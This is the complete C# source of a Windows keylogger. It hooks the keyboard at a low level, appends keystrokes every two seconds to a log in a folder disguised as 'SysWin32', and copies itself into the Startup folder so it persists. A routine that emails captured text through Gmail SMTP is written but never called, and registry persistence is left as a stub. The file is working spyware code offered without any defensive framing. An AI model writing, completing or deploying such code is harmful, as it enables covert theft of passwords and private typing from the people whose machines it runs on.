using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        #region variable declarations
        private static IntPtr _hookptr = IntPtr.Zero;
        // Max length of the keylogbuffer
        //private const byte MAX_BUFFER_LEN = 100;
        // idhook
        private const int whl_keyboard_ll = 13;
        // key down message type
        private const int wm_keydown = 0x0100;
        // translate the key code into an unshifted character value
        private const int mapvk_to_char = 0x02;
        // size of the keylog buffer
        private static int _bufflen = 0;

        private static bool shiftModifier = false;
        // mail password
        private static string _mailpass = string.Empty;

        private static StringBuilder _buffer;
        #endregion

        #region DllImports
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool UnhookWindowsHookEx(IntPtr hook);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc func, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string str);

        [DllImport("user32.dll")]
        public static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion

        public delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lParam);

        public static void Main(string[] args)
        {
            if (!IsInternetConnected()) {
                Terminate("No internet Connection!");
            }

            _hookptr = SetHook(KeyBoardProcCallback);
            _buffer = new StringBuilder();
            // Timer here
            System.Timers.Timer timer = new System.Timers.Timer(2000);
            timer.Elapsed += DispatchKeyLogBuffer;
            timer.Enabled = true;
            timer.AutoReset = true;

            AddToStartup();

            Application.Run();
            UnhookWindowsHookEx(_hookptr);
        }

        /// <summary>
        ///     Register the LowLevelKeyboardProc callback function
        /// </summary>
        /// <param name="func">The callback function</param>
        /// <returns> Returns the newly created hook procedure </returns>
        public static IntPtr SetHook(LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return SetWindowsHookEx(whl_keyboard_ll, keyboardCallback, GetModuleHandle(procModule.ModuleName), 0);
                }
            }
        }

        // this is the function thats going to monitor the keyboard and write to the buffer
        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 && wParam == (IntPtr) wm_keydown ) {
                int vkey = Marshal.ReadInt32(lParam);
                char key = Char.ToLower( Convert.ToChar( MapVirtualKey((uint) vkey, mapvk_to_char)) );
                // output to stdout
                _buffer.Append(key);
                _bufflen++;
                Console.WriteLine($"{_buffer}");
            }
            return CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        /// <summary>
        ///     Write the buffer to the file and then after that immediately clears that buffer
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void DispatchKeyLogBuffer(Object obj, ElapsedEventArgs e)
        {
            if( _bufflen <= 0 ) {
                return;
            }
            using( StreamWriter sw = File.AppendText(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + @"/SysWin32/logs/log.txt") ) {
                sw.Write(_buffer);
            }
            _buffer.Clear();
            _bufflen = 0;
        }

        private static void SendMail(StringBuilder content, string from, string to)
        {
            MailMessage message = new MailMessage(from, to);
            message.Subject = "C# Keylogger";
            message.Body = content.ToString();
            SmtpClient client = new SmtpClient("smtp.gmail.com");
            client.Port = 587;
            client.Credentials = new NetworkCredential(from, _mailpass);
            client.EnableSsl = true;

            try {
                client.Send(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in SendMail(): {0}",
                    ex.ToString());
            }
        }
        public static bool IsInternetConnected()
        {
            using (var wc = new WebClient()) {
                try {
                    using (var stream = wc.OpenRead("http://www.google.com"))
                        return true;
                }
                catch (WebException) {
                    return false;
                }
            }
        }

        public static void AddToStartup()
        {
            var exePath = Application.ExecutablePath;
            var exe = Path.GetFileName(exePath);
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string syswin = appdata + @"/SysWin32/logs";
            string startupPath = startup + @"/" + exe;

            // TODO: use registry run key instead if startup path does not exist

            if ( !Directory.Exists(syswin) ) {
                Directory.CreateDirectory(syswin);
            }
            if( !System.IO.File.Exists(startupPath) ) {
                System.IO.File.Copy(exePath, startupPath);
            }
        }

        public static void AddToRegistry(string exePath)
        {

        }
        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}"); Environment.Exit(1);
        }
    }
}